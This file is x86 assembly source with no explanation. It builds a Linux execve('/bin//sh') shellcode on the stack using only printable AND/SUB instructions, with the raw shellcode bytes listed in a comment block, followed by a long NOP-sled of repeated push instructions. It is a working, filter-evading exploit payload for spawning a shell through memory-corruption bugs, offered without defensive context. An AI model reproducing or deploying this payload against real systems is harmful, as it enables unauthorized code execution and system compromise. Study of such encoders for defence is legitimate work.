global _start
	_start:
		;========================
		; \x90\x90\x90\x31
		; \xc9\x51\x68\x2f
		; \x2f\x73\x68\x68
		; \x2f\x62\x69\x6e
		; \x89\xe3\x6a\x0b
		; \x58\x99\xcd\x80
		;========================
		;  add esp, 1024
		;========================
		push esp
		pop eax
		; add eax, 828 <==> sub eax, (2**32 - 828)
		sub eax, 55555569H
		sub eax, 55555669H
		sub eax, 5655576aH
		push eax
		pop esp
		;========================
		;  set eax = 5899cd80
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 3822652bH
		sub eax, 3822662bH
		sub eax, 3721672aH
		push eax
		;========================
		;  set eax = 89e36a0b
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 275e3252H
		sub eax, 275e3252H
		sub eax, 27603151H
		push eax
		;========================
		;  set eax = 2f62696e
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 46353231H
		sub eax, 45343231H
		sub eax, 45343230H
		push eax
		;========================
		;  set eax = 2f736868
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 462f3333H
		sub eax, 452f3233H
		sub eax, 452e3232H
		push eax
		;========================
		;  set eax = c951682f
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 673a3346H
		sub eax, 673a3246H
		sub eax, 683a3245H
		push eax
		;========================
		;  set eax = 90909031
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 25252545H
		sub eax, 25252545H
		sub eax, 25252545H
		push eax
		;========================
		;  set eax = 90909090
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 25252526H
		sub eax, 25252525H
		sub eax, 25252525H
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax

